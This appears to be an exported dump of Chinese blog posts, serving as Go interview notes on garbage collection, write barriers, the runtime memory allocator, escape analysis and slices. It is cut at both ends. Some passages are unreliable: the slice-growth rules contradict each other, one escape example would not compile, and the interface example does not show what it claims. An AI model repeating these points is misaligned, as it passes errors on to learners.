以返回用户所需的页数。剩余的页构成一个新的mspan放回mheap的空闲列表; 如果mheap中没有可用的span, 则向操作系统申请一系列新的页(最小1MB)。Go会在操作系统分配超大的页(称作arena)。分配一大批页会减少和操作系统通信的成本; 内存回收go内存会分成堆区(Heap)和栈区(Stack)两个部分, 程序在运行期间可用主动从堆区申请内存空间, 这些内存由内存分配器分配并由垃圾收集器回收。栈区内存由编译器自动进行分配和释放, 栈区中存储的参数以及局部变量, 它们会随着函数的创建而创建, 函数的返回而销毁。如果只申请和分配内存, 内存终将枯竭, Go使用垃圾回收收集不再使用的span, 把span释放交给mheap, mheap对span进行span的合并, 把合并后的span加入到scav树中, 等待再分配内存时, 由mheap进行内存再分配。因此, Go堆是Go垃圾收集器管理主要区域; 标记清除算法当成功区分出Go垃圾收集器管理区域的存活对象和死亡对象后, Go垃圾收集器接下来的任务就是执行GC, 释放无用对象占用的内存空间, 以便有足够的可用内存空间为新对象分配内存。 当堆空间被耗尽时, 就会STW(stop the world), 其执行过程可以分成标记和清除两个阶段。Go垃圾收集器从根节点开始遍历, 执行可达性分析算法, 递归标记所有被引用的对象为存活状态; 标记阶段结束后, 垃圾收集器会依次遍历堆中的对象并清除其中的未被标记为存活的对象; 由于用户程序在垃圾收集的过程中也不能执行(STW)。在可达性分析算法, Go的GC Roots一般为全局变量和G Stack中的引用指针, 和整堆的对象相比只是极少数, 因此它带来的停顿是非常短暂且相对固定的, 不随堆容量增长。在从GC Roots往下遍历对象的过程, 堆越大, 存储对象越多, 递归遍历越复杂, 要标记更多对象而产生的停顿时间自然就更长。因此我们需要用到更复杂的机制来解决STW的问题; 三色可达性分析为了解决标记清除算法带来的STW问题, Go和Java都会实现三色可达性分析标记算法的变种以缩短STW的时间。三色可达性分析标记算法按”是否被访问过”将程序中的对象分成白色、黑色和灰色: 白色对象 - 对象尚未被垃圾收集器访问过, 在可达性分析刚开始的阶段, 所有的对象都是白色的, 若在分析结束阶段, 仍然是白色的对象, 即代表不可达; 黑色对象 - 表示对象已经被垃圾收集器访问过, 且这个对象的所有引用都已经被扫描过, 黑色的对象代表已经被扫描过而且是安全存活的, 如果有其他对象指向黑色对象无需再扫描一遍, 黑色对象不可能直接(不经过灰色对象)指向某个白色对象; 灰色对象 - 表示对象已经被垃圾收集器访问过, 但是这个对象上至少存在一个引用还没有被扫描过, 因此存在指向白色对象的外部指针, 垃圾收集器会扫描这些对象的子对象; 三色可达性分析算法大致流程是(初始状态所有对象都是白色): 从GC Roots开始枚举, 它们所有的直接引用变成灰色(移入灰色集合), GC Roots变为黑色; 从灰色集合中取出一个灰色对象进行分析: 将这个对象所有的直接引用变为灰色, 放入灰色集合中; 将这个对象变为黑色; 重复步骤2, 一直重复直到灰色集合为空; 分析完成, 仍然是白色的对象就是GC Roots不可达的对象, 可以作为垃圾被清理; 具体例子如下图所示, 经过三色可达性分析, 最后白色H为不可达的对象, 是需要垃圾回收的对象; 三色可达性分析 三色标记清除算法本身是不可以并发或者增量执行的, 它需要STW, 而如果并发执行, 用户程序可能在标记执行的过程中修改对象的指针; 三色标记清除算法(增量执行) 这种情况一般会有2种: 一种是把原来应该垃圾回收的死亡对象错误的标记为存活。虽然这不好，但是不会导致严重后果, 只不过产生了一点逃过本次回收的浮动垃圾而已, 下次清理即可, 比如上图所示的三色标记过程种, 用户取消了从B对象到E对象的引用, 但是因为B到E已经被标记完成不会继续执行步骤2, 所以E对象最终会被错误的标记成黑色, 不会被回收, 这个D就是浮动垃圾, 会在下次垃圾收集中清理; 一种是把原本存活的对象错误的标记为死亡, 导致”对象消失”, 这在内存管理种是非常严重的错误。比如上图所示的三色标记过程种, 用户程序建立了从B对象到H对象的引用(例如B.next&#x3D;H), 接着执行D.next&#x3D;nil, 但是因为B到H中不存在灰色对象, 因为在这之间不会继续执行三色并发标记中的步骤2, D到H之间的链接被断开, 所以H对象最终会被标记成白色, 会被垃圾收集器错误的回收。我们将这种错误称为悬挂指针, 即指针没有指向特定类型的合法对象, 影响了内存的安全性; 屏障技术为了解决上述的”对象消失”的现象, Wilson于1994年在理论上证明了, 当且仅当以下两个条件同时满足时, 会产生”对象消失”的问题, 即原本应该是黑色的对象被误标为白色: 赋值器插入了一条或多条从黑色对象到白色对象的新引用; 赋值器删除了全部从灰色对象到该白色对象的直接或间接引用; 因此为了要解决并发扫描时的对象消失问题, 保证垃圾收集算法的正确性, 只需破坏这两个条件的任意一个即可, 屏障技术就是在并发或增量标记过程中保证三色不变性的重要技术; 内存屏障技术是一种屏障指令, 它可以让CPU或者编译器在执行内存相关操作时遵循特定的约束, 目前多数的现代处理器都会乱序执行指令以最大化性能, 但是该技术能够保证内存操作的顺序性, 在内存屏障前执行的操作一定会先于内存屏障后执行的操作。垃圾收集中的屏障技术更像是一个钩子方法, 它是在用户程序读取对象、创建新对象以及更新对象指针时执行的一段代码, 根据操作类型不同, 我们可以将它们分成读屏障(Read barrier)和写屏障(Write barrier)两种, 因此读屏障需要在读操作中加入代码片段, 对用户程序的性能影响很大, 所以编程语言往往都会采用写屏障保证三色不变性; 插入写屏障Dijksrea在1978年提出了插入写屏障, 也被叫做增量更新, 通过如下所示的写屏障, 破坏上述第一个条件(赋值器插入了一条或多条从黑色对象到白色对象的新引用): 12345678func DijkstraWritePointer(slot *unsafe.Pointer, ptr unsafe.Pointer) &#123; shade(ptr) //先将新下游对象 ptr 标记为灰色 *slot = ptr&#125;//说明：添加下游对象(当前下游对象slot, 新下游对象ptr) &#123; //step 1 标记灰色(新下游对象ptr) //step 2 当前下游对象slot = 新下游对象ptr &#125;//场景：A.添加下游对象(nil, B) //A 之前没有下游， 新添加一个下游对象B， B被标记为灰色A.添加下游对象(C, B) //A 将下游对象C 更换为B， B被标记为灰色 上述伪代码非常好理解, 当黑色对象(slot)插入新的指向白色对象(ptr)的引用关系时, 就尝试使用shade函数将这个新插入的引用(ptr)标记为灰色; 插入写屏障 假设我们上图的例子并发可达性分析中使用了插入写屏障: GC将根对象Root2指向的B对象标记成黑色并将B对象指向的对象D标记成灰色; 用户程序修改指针, B.next&#x3D;H这时触发写屏障将H对象标记成灰色; 用户程序修改D.next&#x3D;nil; GC依次遍历程序中的H和D将它们分别标记成黑色; 由于栈上的对象在垃圾回收中被认为是根对象, 并没有写屏障, 那么导致黑色的栈对象可能指向白色的堆对象, 例如上图1中Root2指向H, 且删除了由D指向H的引用, 由于没有写屏障, 那么H将会被删除。为了保障内存安全, Dijkstra必须为栈上的对象增加写屏障或者在标记阶段完成重新对栈上的对象进行扫描, 这两种方法各有各的缺点, 前者会大幅度增加写入指针的额外开销, 后者重新扫描栈对象时需要暂停对象, 垃圾收集算法的设计者需要在这两者之间做出权衡; 删除写屏障Yuasa在1990年提出了删除写屏障, 因为一旦该写屏障开始工作, 它会保证开启写屏障时堆上所有对象的可达, 起始时STW扫描所有的goroutine栈, 保证所有堆上在用的对象都处于灰色保护下, 所以也被称为快照垃圾收集(Snapshot GC), 这是破坏了”对象消失”的第二个条件(赋值器在删除了全部从灰色对象到该白色对象的直接或间接引用); 12345678910// 黑色赋值器 Yuasa 屏障func YuasaWritePointer(slot *unsafe.Pointer, ptr unsafe.Pointer) &#123; shade(*slot) // 先将*slot标记为灰色 *slot = ptr &#125;//说明：添加下游对象(当前下游对象slot， 新下游对象ptr) &#123; //step 1 if (当前下游对象slot是灰色 || 当前下游对象slot是白色) &#123; 标记灰色(当前下游对象slot) //slot为被删除对象， 标记为灰色 &#125; //step 2 当前下游对象slot = 新下游对象ptr&#125;//场景A.添加下游对象(B, nil) //A对象，删除B对象的引用。B被A删除，被标记为灰(如果B之前为白)A.添加下游对象(B, C) //A对象，更换下游B变成C。B被A删除，被标记为灰(如果B之前为白) 上述代码会在老对象的引用被删除时, 将白色的老对象涂成灰色, 这样删除写屏障就可以保证三色不变性, 老对象引用的下游对象一定可以被灰色对象引用; 但是这样也会导致一个问题, 由于会将有存活可能的对象都标记成灰色, 因此最后可能会导致应该回收的对象未被回收, 这个对象只有在下一个循环才会被回收, 比如下图的D对象 此处有图片 由于原始快照的原因, 起始也是执行STW, 删除写屏障不适用于栈特别大的场景, 栈越大, STW扫描时间越长; 混合写屏障在Go语言v1.7版本之前, 运行时会使用Dijkstra插入写屏障保证三色不变性, 但是运行时并没有在所有垃圾收集根对象上开启插入写屏障。因为应用程序可能包含成百上千的Goroutine, 而垃圾收集的根对象一般包括全局变量和栈对象, 如果运行时需要在几百个Goroutine的栈上都开启写屏障, 会带来巨大的额外开销, 所以Go团队在v1.8结合上述2种写屏障构成了混合写屏障, 实现上选择了在标记阶段完成时暂停程序、将所有栈对象标记成灰色并重新扫描; Go语言在v1.8组合Dijkstra插入写屏障和Yuasa删除写屏障构成了如下所示的混合写屏障, 该写屏障会将覆盖的对象标记成灰色并在当前栈没有扫描时将新对象也标记成灰色; 1234567func writePointer(slot, ptr) &#123; shade(*slot) if current stack is grey &#123; shade(ptr) &#125; *slot = ptr&#125; 为了移除栈的重新扫描过程, 除了引入混合写屏障之外, 在垃圾收集的标记阶段, 我们还需要将创建的所有新对象都标记成黑色, 防止新分配的栈内存和堆内存中的对象被错误地回收, 以为栈内存在标记阶段最终都会变为黑色, 所以不再需要重新扫描栈空间。总结来说主要有这几点: GC开始将栈上地对象全部扫描并标记为黑色; GC期间, 任何在栈上创建地新对象, 均为黑色; 被删除的堆对象标记成灰色; 被添加的堆对象标记成灰色; 模拟面试STW（Stop-The-World） STW问题: 在垃圾回收期间, 所有的程序操作都被暂停, 直到垃圾回收过程完成。这对高并发应用特别有害, 因为它会导致显著的响应时间和系统吞吐量下降。 STW的具体影响有哪些？例如在响应时间和吞吐量方面 响应时间: STW会导致所有Goroutine暂停, 用户请求无法得到及时响应, 导致应用程序的响应时间增加。 吞吐量: 在STW期间, 整个系统的处理能力会下降, 因为没有任何工作在进行。这会降低系统的吞吐量, 使得单位时间内处理的请求数量减少。 屏障技术 屏障技术: 通过在程序的某些操作上设置”屏障”, 来减少STW的时间。屏障主要有三种类型: 写屏障, 读屏障和删除屏障。 具体屏障类型 写屏障: 写屏障在对象引用被写入时触发, 通过记录这些修改, 确保垃圾回收器能够跟踪到所有引用的变化。 插入写屏障: 在对象引用被插入时触发。当一个新引用被写入某个对象字段时, 写屏障会记录这个操作。它确保在GC过程中, 这个新的引用被正确地标记和处理; 删除写屏障: 在对象引用被删除时触发, 当一个引用从某个对象字段中被删除时, 写屏障会记录下这个操作, 确保GC能够正确处理引用的删除; 混合写屏障: 结合了插入和删除写屏障的特性, 确保在对象引用被修改时正确记录, 结合插入和删除写屏障的功能, 确保任何引用的变化都能被追踪到。 具体实现: 插入写屏障: 在对象赋值操作前, 插入写屏障逻辑, 记录新引用的对象; 删除写屏障: 在对象字段被清空或重新赋值前, 记录旧引用的对象; 混合写屏障: 综合上述两种操作, 确保所有引用变化都被记录; 三色标记清除算法的每一步是什么, 以及每一种颜色在个步中的作用？步骤: 初始化: 所有对象开始都是白色; 标记根对象: 从根对象（Roots）开始扫描, 将根对象标记为灰色, 并将其放入待处理队列; 处理灰色对象: 取出一个灰色对象, 将它标记为黑色; 扫描该对象引用的所有子对象, 将未标记的子对象标记为灰色, 并放入待处理队列; 重复: 重复上一步, 直到待处理队列为空; 清除白色对象: 所有未被标记为黑色对象（即白色对象）被认为是垃圾并清除; 颜色含义: 黑色: 已访问并处理完毕的对象, 不再需要扫描; 灰色: 已访问但其引用的对象还未全部处理的对象, 需要进一步扫描; 白色: 未访问的对象, 被认为是垃圾; Slice 在Go语言中, Slice是一个动态数组的封装, 它由三个部分组成: 指向底层数组的指针、长度（len）和容量（cap）。 12345type slice struct &#123; ptr *ElementType // 指向底层数组的指针 len int // 当前slice中元素的个数 cap int // slice的容量, 即底层数组中的元素个数&#125; slice扩容策略 每次扩容会使得新的容量变为原来的2倍(cap*2); 如果当前slice的容量小于1024, 则每次扩容时新容量会变为原来的1.25倍(cap*1.25)。这种情况下, 对于小型slice, 扩容增长速度会慢一些, 以节省空间; 如果slice的长度小于1024, 则新的容量会按照上述规则进行计算。否则, 新的容量会增加与当前slice长度的一半; 当slice进行扩容时, Go语言会进行以下操作: 分配一个新的底层数组, 并将原有的元素拷贝到新数组中; 将slice的指针指向新的底层数组, 同时更新slice的长度和容量;","categories":[{"name":"Golang","slug":"Golang","permalink":"http://example.com/categories/Golang/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"http://example.com/tags/Golang/"}]},{"title":"Golang内存管理","slug":"Golang内存管理","date":"2024-03-12T14:49:09.000Z","updated":"2024-04-16T15:19:53.850Z","comments":true,"path":"e2894e3d.html","link":"","permalink":"http://example.com/e2894e3d.html","excerpt":"Golang内存分配机制Go语言内置运行时(就是runtime), 抛弃了传统的内存分配方式, 改为自主管理。这样可以自主实现更好的内存使用模式, 比如内存池、预分配等等。这样, 不会每次内存分配都需要系统调用;","text":"Golang内存分配机制Go语言内置运行时(就是runtime), 抛弃了传统的内存分配方式, 改为自主管理。这样可以自主实现更好的内存使用模式, 比如内存池、预分配等等。这样, 不会每次内存分配都需要系统调用; 设计思想 内存分配算法采用Google的TCMalloc算法, 每个线程都会自行维护一个独立的内存池, 进行内存分配时优先从该内存池中分配, 当内存池不足时才会向加锁的全局内存池申请, 减少系统调用并且避免不同线程对全局内存池的锁竞争; 把内存切分的非常细小, 分为多级管理, 以降低锁的粒度; 回收对象时, 并没有将其真正释放, 只是放回预先分配的大块内存中, 以便复用。只有内存闲置过多的时候, 才会尝试归还部分内存给操作系统, 降低整体开销; 分配组件 Go的内存管理组件主要有: mspan、mcache、mcentral和mheap; 内存分配 内存管理单元: mspanmspan是内存管理的基本单元, 该结构体中包含next和prev两个字段, 它们分别指向前一个和后一个mspan, 每个mspan都管理npages个大小为8kb的页, 一个span是由多个page组成, 这里的页不是操作系统中的内存页, 它们是操作系统内存页的整数倍; page是内存存储的基本单元, “对象”放到page中 12345678910type mspan struct &#123; next *mspan // 前指针 prev *mspan // 后指针 startAddr uintptr // 管理页的起始地址, 指向page npages uintptr // 页数 spanclass spanClass // 规格 ...&#125;type spanClass uint8 Go有68种不同大小的spanClass, 用于小对象分配 12const _NumSizeClasses = 68var class_to_size = [_NumSizeClasses]uint16&#123;0, 8, 16, 32, 48, 64, 80, 96, 112, 128, 144, 160, 176, 192, 208, 224, 240, 256, 288, 320, 352, 384, 416, 448, 480, 512, 576, 640, 704, 768, 896, 1024, 1152, 1280, 1408, 1536,1792, 2048, 2304, 2688, 3072, 3200, 3456, 4096, 4864, 5376, 6144, 6528, 6784, 6912, 8192, 9472, 9728, 10240, 10880, 12288, 13568, 14336, 16384, 18432, 19072, 20480, 21760, 24576, 27264, 28672, 32768&#125; 如果按照序号为1的spanClass(对象规格为8B)分配, 每个span占用堆的字节数: 8k, mspan可以保存1024个对象;如果按照序号为2的spanClass(对象规格为16B)分配, 每个span占用堆的字节数: 8k, mspan可以保存512个对象;…如果按照序号为67的spanClass(对象规格为32K)分配, 每个span占用堆的字节数: 32k, mspan可以保存1个对象; class bytes&#x2F;obj bytes&#x2F;span objects tail waste max waste 1 8 8192 1024 0 87.50% 2 16 8192 512 0 43.75% 3 24 8192 341 0 29.24% 4 32 8192 256 0 46.88% 5 48 8192 170 32 31.52% 6 64 8192 128 0 23.44% 7 80 8192 102 32 19.07% … … … … … … 67 32768 8192 1 0 12.50% 字段含义: class: class ID, 每个span结构种都有一个class ID, 表示该span可处理的对象类型; bytes&#x2F;obj: 该class代表对象的字节数; bytes&#x2F;span: 每个span占用堆的字节数, 也即页数*页大小; objects: 每个span可分配的对象个数, 也即(bytes&#x2F;spans) &#x2F; (bytes&#x2F;obj); waste bytes: 每个span产生的内存碎片, 也即(bytes&#x2F;spans) % (bytes&#x2F;obj) 大于32k的对象出现时, 会直接从heap分配一个特殊的span, 这个特殊的span的类型(class)是0, 只包含了一个大对象; 线程缓存: mcachemcache管理线程在本地缓存的mspan, 每个goroutine绑定的P都有一个mcache字段 123456type mcache struct &#123; alloc [numSpanClasses]*mspan&#125;_NumSizeClasses = 68numSpanClasses = _NumSizeClasses &lt;&lt; 1 mcache和Span Classes作为索引管理多个用于分配的mspan, 它包含所有规格的mspan。它是_NumSizeClasses的2倍, 也就是68*2=136, 其中*2是将spanClass分成了有指针和没有指针两种, 方便于垃圾回收。对于每种规格, 有2个mspan, 一个不包含指针, 另一个则包含指针。对于无指针对象的mspan在进行垃圾回收时无需进一步扫描它是否引用了其他活跃的对象。 mcache在初始化的时候是没有任何mspan资源的, 在使用过程种会动态地从mcentral申请, 之后会缓存下来。当对象小于等于32KB时, 使用mcache的相应规格的mspan进行分配。 中心缓存: mcentralmcentral管理全局的mspan供所有线程使用, 全局mheap变量包含central字段, 每个mcentral结构都维护在mheap结构内; 123456type mcentral struct &#123; spanClass spanClass // 指当前规格大小 partial [2]spanSet // 有空闲object的mspan列表 full [2]spanSet // 没有空闲object的mspan列表&#125; 每个mcentral管理一种spanClass的span, 并将有空闲空间和没有空闲空间的mspan分开管理。partail和full的数据类型为spanSet, 表示mspans集, 可用通过pop、push来获得mspans; 12345678type spanSet struct &#123; spineLock mutex spine unsafe.Pointer // 指向[]span指针 spineLen uintptr // Spine array length, accessed atomically spineCap uintptr // Spine array cap, accessed under lock index headTailIndex // 前32位是头指针, 后32位是尾指针 &#125; 简单说下mcache从mcentral获取和归还mspan的流程: 获取: 加锁, 从partail链表找到一个可用的mspan; 并将其从partail链表删除; 将取出的mspan加入到full链表中; 将mspan返回给工作流程, 解锁; 归还: 加锁, 将mspan从full链表中删除, 将mspan加入到partail链表中, 解锁; 页堆: mheapmheap管理Go所有动态分配内存, 可以认为是Go程序持有整个堆空间, 全局唯一; 123456789101112131415var mheap_ mheaptype mheap struct &#123; lock mutex // 全局锁 pages pageAlloc // 页面分配的数据结构 allspans []*mspan // 所有通过mheap_申请的mspans //堆 arenas [1 &lt;&lt; arenas1Bits]*[1 &lt;&lt; arenas2Bits]*heapArena // 所有中心缓存mcentral central [numSpanClasses]struct &#123; mcentral mcentral pad [cpu.CacheLinePadSize - unsafe.Sizeof(mcentral&#123;&#125;) % cpu.CacheLinePadSize]byte &#125; ...&#125; 所有mcentral的集合则是存放于mheap中的。mheap里的arena区域是堆内存的抽象, 运行时会将8KB看做一页, 这些内存页存储了所有在堆上初始化的对象。运行时使用二维的runtime.heapArena数组管理所有的内存, 每个runtime.heapArena都会管理64MB的内存; 当申请内存时, 依次经过mcache和mcentral都没有可用合适规格的大小内存, 这时候会向mheap申请一块内存。然后按指定规格划分为一些列表, 并将其添加到相同规格大小的mcentral的非空闲列表后面; 分配对象 微对象(0, 16B): 先使用线程缓存上的微型分配器, 再依次尝试线程缓存、中心缓存、堆 分配内存; 小对象(16B, 32KB): 一次尝试线程缓存、中心缓存、堆 分配内存; 大对象(32KB, +∞): 直接尝试堆分配内存; 分配流程 首先通过计算使用的大小规格; 然后使用mcache中对应大小规格的块分配; 如果mcentral中没有可用的块, 则向mheap申请, 并根据算法找到最合适的mspan; 如果申请到的mspan超出申请大小, 将会根据需求进行切分, 以返回用户所需的页数, 剩余的页构成一个新的mspan放回mheap的空闲列表中; 如果mheap中没有可用的span, 则向操作系统申请一系列新的页(最小1MB); Golang内存分配流程 Golang内存管理-其二TCMalloc go内存管理是借鉴了TCMalloc的设计思想, TCMalloc全称Thread-Caching Malloc, 是Google开发的内存分配器。 TCMalloc Page操作系统对内存管理以页为单位, TCMalloc也是这样, 只不过TCMalloc里的Page大小与操作系统大小并不一定相等, 而是倍数关系; Span一组连续的Page被称为Span, 比如可以有4个页大小的Sapn, 也可以有8个页大小的Span, Span比Page高一个层级, 是为了方便管理一定大小的内存区域, Span是TCMalloc中内存管理的基本单位; ThreadCache每个线程各自的Cache, 一个Cache包含多个空闲内存块链表, 每个链表连接的都是内存块, 同一个链表上的内存块的大小是相同的, 也可以说按内存块大小给内存块分了个类, 这样可以根据申请的内存大小, 快速从合适的链表选择空闲内存块, 由于每个线程有自己的ThreadCache, 所以ThreadCache访问是无锁的; CentalCache是所有线程共享的缓存, 也是保存的空闲内存块链表, 链表的数量与ThreadCache中链表数量相同, 当ThreadCache内存块不足时, 可以从CentralCache中取; 当ThreadCache内存块多时, 可以放回CentralCache中; 由于CentralCache是共享的, 所有它的访问是要加锁的; PageHeapPageHeap是堆内存的抽象, PageHeap存的也是若干链表, 链表保存的是Span, 当CentralCache没有内存时, 会从PageHeap中取, 把1个Span拆成若干内存块, 添加到对应大小的链表中, 当CentralCache内存多的时候, 会放回PageHeap中; TCMalloc对象分配小对象直接从ThreadCache中分配, 若ThreadCache不够则从CentralCache中获取内存, CentralCache内存不够时再从PageHeap中获取内存, 大对象在PageHeap中选择合适的页组成Span用于存储数据; Go内存管理经过上述对TCMalloc内存管理的描述, 接着看一下Go内存管理架构图 Go内存管理 Page和TCMalloc中的Page相同, 图中最下方浅蓝色长方形代表一个Page; Span与TCMalloc中的Span相同, Span是go内存管理的基本单元, 代码中为mspan, 一组连续的Page组成1个Span, 所以上图一组连续的浅蓝色长方形代表的是一组Page组成的1个Span, 另外, 1个淡紫色长方形为1个Span; mcachemcache与TCMalloc中的ThreadCache类似, mcache保存的是各种大小的Span, 并按Span class分类, 小对象直接从mcache分配内存, 它起到了缓存的作用, 并且可以无锁访问。但mcache与ThreadCache也有不同点, TCMalloc中是每个线程1个ThreadCache, Go中是每个P拥有1个mcache, 因为在Go程序中, 当前最多有GOMAXPROC个线程运行, 所以最多需要GOMAXPROCS个mcache就可以保证各线程对mache的无锁访问, 下图是G, P, M三者之间的关系: GMP模型 mcentralmcentral与TCMalloc中的CentralCache类似, 是所有线程共享的缓存, 需要加锁访问, 它按Span class对Span分类, 串联成链表, 当mcache的某个级别Span的内存被分配光时, 它会向mcentral申请1个当前级别的Span。但mcentral与CentralCache也有不同点, CentralCache是每个级别的Span有1个链表, mcache是给个级别的Span有2个链表; mheapmheap与TCMalloc中的PageHeap类似, 它是堆内存的抽象, 把从OS（系统）申请出的内存页组织成Span, 并保存起来。当mcentral的Span不够用时会向mheap申请, mheap的Span不够用时会向OS申请, 向OS的内存申请是按页来的, 然后把申请来的内存页生成Span组织起来, 同样也是需要加锁访问的。但mheap与PageHeap也有不同点: mhep把Span组织成了树结构, 而不是链表, 并且还是两棵树, 然后把Span分配到heapArena进行管理, 它包含地址映射和Span是否包含指针等位图, 这样做的主要原因是为了更高效的利用内存: 分配、回收和再利用; 学习参考资料 GOLANG ROADMAP · 知识星球 腾讯云开发者","categories":[{"name":"Golang","slug":"Golang","permalink":"http://example.com/categories/Golang/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"http://example.com/tags/Golang/"}]},{"title":"Golang内存逃逸","slug":"Golang内存逃逸","date":"2024-03-12T13:56:08.000Z","updated":"2024-03-12T14:47:56.175Z","comments":true,"path":"b731d75e.html","link":"","permalink":"http://example.com/b731d75e.html","excerpt":"什么是内存逃逸在程序中, 每个函数块都会有自己的内存区域来存自己的局部变量(内存占用少)、返回地址、返回值之类的数据, 这一块内存区域有特定的结构和寻址方式, 寻址起来十分迅速, 开销很少。这一块内存地址称为栈, 栈是线级别的, 大小在创建的时候已经确定, 当变量太大的时候, 会”逃逸”到堆上, 这种现象称为内存逃逸, 简单来说, 局部变量通过堆分配和回收, 就叫内存逃逸。","text":"什么是内存逃逸在程序中, 每个函数块都会有自己的内存区域来存自己的局部变量(内存占用少)、返回地址、返回值之类的数据, 这一块内存区域有特定的结构和寻址方式, 寻址起来十分迅速, 开销很少。这一块内存地址称为栈, 栈是线级别的, 大小在创建的时候已经确定, 当变量太大的时候, 会”逃逸”到堆上, 这种现象称为内存逃逸, 简单来说, 局部变量通过堆分配和回收, 就叫内存逃逸。 内存逃逸的危害 堆是一块没有特定结构, 也没有固定大小的内存区域, 可以根据需要进行调整。全局变量, 占用较大的局部变量, 函数调用结束后不能立刻回收的局部变量就会存在堆里面。变量在堆上的分配和回收都比在栈上开销大的多。对于go这种带GC的语言来说, 会增加GC压力, 同时容易造成内存碎片。 如何分析程序是否发生内存逃逸 build时添加-gcflags=&quot;-m&quot;选项可分析内存逃逸情况。比如输出./main.go:3:6: moved to heap: x表示局部变量x逃逸到了堆上。 内存逃逸发生时机1. 向channel发送指针数据 因为在编译时, 不知道channel中的数据会被哪个goroutine接收, 因此编译器没法知道变量什么时候会被释放, 因此只能放到堆中; 1234567891011121314151617package mainfunc main() &#123; ch := make(chan int, 1) x := 5 ch &lt;- 5 // x不发生逃逸, 因为只是复制值 ch1 := make(chan int, 1) y := 5 py := &amp;y ch1 &lt;- py // y逃逸, 因为y地址传入chan中, 编译时无法确定什么时候会被接收, 所以无法在函数返回后回收y&#125;// 输出# command-line-arguments./test_Demo_04.go:5:6: can inline main./test_Demo_04.go:16:2: moved to heap: y 2. 局部变量在函数调用结束后还被其他地方使用 局部变量在函数调用结束后还被其他地方使用, 比如函数返回局部变量指针或闭包中引用包外的值。因为变量的生命周期可能会超过函数周期, 因此只能放入堆中; 123456789101112131415161718192021222324package mainfunc foo() func() &#123; x := 5 // x发生逃逸, 因为在foo调用完成后, 被闭包函数用到, 还不能回收, 只能放到堆上存放 return func() &#123; x += 1 &#125;&#125;func main() &#123; inner := foo() inner()&#125;// 输出# command-line-arguments./test_Demo_04.go:5:6: can inline Foo./test_Demo_04.go:7:9: can inline Foo.func1./test_Demo_04.go:18:14: inlining call to Foo./test_Demo_04.go:7:9: can inline main.Foo.func1./test_Demo_04.go:19:7: inlining call to main.Foo.func1./test_Demo_04.go:6:2: moved to heap: x./test_Demo_04.go:7:9: func literal escapes to heap./test_Demo_04.go:18:14: func literal does not escape 在slice或map中存储指针 比如[]*string, 其后面的数组可能是在栈上分配的, 但其引用的值还是堆上; 12345678910111213package mainfunc main() &#123; var x int x = 10 var ls []*int ls = append(ls, &amp;x) // x发生逃逸, ls存储的是指针, 所以ls底层的数组虽然在栈上存储, 但本身却逃逸到堆上&#125;// 输出# command-line-arguments./test_Demo_04.go:5:6: can inline main./test_Demo_04.go:11:6: moved to heap: x 4. 切片扩容 切片扩容后长度太长, 导致栈空间不足, 逃逸到堆上; 12345678910111213package mainfunc main() &#123; s := make([]int, 10000, 10000) for index, _ := range s &#123; s[index] = index &#125;&#125;// 输出# command-line-arguments./test_Demo_04.go:5:6: can inline main./test_Demo_04.go:11:11: make([]int, 10000) escapes to heap 5. 在interface类型上调用方法 在interface类型上调用方法时会把interface变量使用堆分配, 因为方法的真正实现只能在运行时知道; 12345678910111213141516171819202122package maintype foo interface &#123; fooFunc()&#125;type foo1 struct&#123;&#125;func (f1 foo1) fooFunc() &#123;&#125;func main() &#123; var f foo1 f = foo1&#123;&#125; f.fooFunc() // 调用方法时, f发生逃逸, 因为方法是动态分配的&#125;// 输出# command-line-arguments./test_Demo_04.go:12:6: can inline foo1.fooFunc./test_Demo_04.go:16:6: can inline main&lt;autogenerated&gt;:1: inlining call to foo1.fooFunc./test_Demo_04.go:18:10: foo1&#123;&#125; escapes to heap 避免内存逃逸的方法 对于小型数据, 使用传值而不是传指针, 避免内存逃逸; 避免使用长度不固定的slice切片, 在编译期无法确定切片长度, 只能将切片使用堆分配; interface调用方法会发生内存逃逸;","categories":[{"name":"Golang","slug":"Golang","permalink":"http://example.com/categories/Golang/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"http://example.com/tags/Golang/"}]},{"title":"Golang八股文汇总","slug":"Golang八股文汇总","date":"2024-02-17T13:10:13.000Z","updated":"2024-03-05T15:44:47.932Z","comments":true,"path":"f25d7e27.html","link":"","permalink":"http://example.com/f25d7e27.html","excerpt":"记录Golang面试八股文","text":"记录Golang面试八股文 Go基础init和main函数的相关特点init函数（没有输入参数、返回值）的主要作用: 初始化不能采用初始化表达式初始化的变量; 在程序运行前注册; 实现sync.Once功能; 其他 init顺序 在同一个package中, 可以多个文件中定义init方法; 在同一个go文件中, 可以重复定义init方法; 在同一个package中, 不同文件中的init方法执行按照文件名先后执行各个文件中的init方法; 在同一个文件中的多个init方法, 按照在代码中编写的顺序依次执行不同的init方法; 对于不同的package, 如果不相互依赖的话, 按照main包中import的顺序调用其包中的init()函数; 如果package存在依赖, 调用顺序为最后被依赖的最先被初始化, 例如: 导入顺序main -&gt; A -&gt; B -&gt; C, 则初始化顺序为C -&gt; B -&gt; A -&gt; main, 一次执行对应的init方法; Golang-init函数执行顺序 Golang的数据结构的零值是什么?所有整型类型: 0浮点类型: 0.0布尔类型: false字符串类型: “”指针、interface、切片(slice)、channel、map、function: nilGo的零值初始是递归的, 即数组、结构体等类型的零值初始化就是对其组成元素逐一进行零值初始化 byte和rune有什么区别rune和byte在Go语言中都是字符类型, 且都是别名类型;byte型本质上是uint8类型的别名, 代表了ASCII码的一个字符;rune型本质上是int32型的别名, 代表一个UTF-8字符; Go struct 能不能比较需要根据具体情况分析, 如果struct中含有不能被比较的字段类型, 就不能被比较;如果struct中所有的字段类型都支持比较, 那么就支持比较; 不能被比较的类型slice, 因为slice是引用类型, 除非是和nil比较;map, 和slice同理, 如果要比较两个map只能通过循环遍历实现;函数类型; 注意结构体之间只能比较它们是否相等, 而不能比较它们的大小;只能所有属性相等而且属性顺序一致的结构体才能进行比较; Go import的三种方式加下划线import下划线（如：_ “github.com&#x2F;xxx&#x2F;xxx”）的作用: 当导入一个包时, 该包下的文件里所有的init()函数都会被执行。然而有些时候我们并不需要把整个包都导入进来, 仅仅是希望它执行init()函数而已。这个时候就可以使用import _引用该包。即: 使用[import _ 包路径]只是引用该包, 仅仅是为了调用init函数, 所以无法通过包名来调用包中的其他函数; 加点(.)import和引用的包名之间加点（.）操作的含义就是这个包导入之后在调用这个包的函数时, 可以省略前戳的包名; 别名别名操作可以把包命名成另一个用起来容易记忆的名字; Golang的常量地址123456789const i = 100var j = 